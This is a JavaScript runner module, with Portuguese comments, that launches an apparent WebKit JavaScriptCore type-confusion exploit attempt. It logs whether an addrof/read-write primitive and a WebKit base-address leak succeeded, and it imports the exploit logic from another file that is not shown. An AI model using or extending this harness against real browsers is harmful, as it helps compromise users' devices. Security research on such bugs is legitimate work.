// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para R52 - Type Confusion no JSC Heap - Corrigido)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';

import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R52,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V91_TC_R52_WEBKIT
} from './testArrayBufferVictimCrash.mjs';


async function runJSCHeapTCStrategy_R52() {
    const FNAME_RUNNER = "runJSCHeapTCStrategy_R52";
    logS3(`==== INICIANDO Estratégia de Type Confusion no JSC Heap (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R52();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V91_TC_R52_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R52: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        const addrofSuccess = result.addrof_result?.success;
        const webkitLeakSuccess = result.webkit_leak_result?.success;

        logS3(`  RUNNER R52: Completou.`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R52: Teste Addrof/RW: ${result.addrof_result.msg}`, addrofSuccess ? "vuln" : "warn", FNAME_RUNNER);
        logS3(`  RUNNER R52: Teste WebKit Base Leak: ${result.webkit_leak_result.msg}`, webkitLeakSuccess ? "vuln" : "warn", FNAME_RUNNER);

        if (webkitLeakSuccess) {
            document.title = `${module_name_for_title}_R52: WebKitLeak SUCCESS!`;
        } else if (addrofSuccess) {
            document.title = `${module_name_for_title}_R52: Addrof OK`;
        } else {
             document.title = `${module_name_for_title}_R52: Exploit Fail`;
        }
    } else {
        document.title = `${module_name_for_title}_R52: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Type Confusion no JSC Heap (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    // --- CORREÇÃO: Usar o nome da variável com 'WEBKIT' em maiúsculas, como foi importado. ---
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V91_TC_R52_WEBKIT}_MainOrchestrator`;
    logS3(`==== INICIANDO Script (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runJSCHeapTCStrategy_R52();
    
    logS3(`\n==== Script (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
}
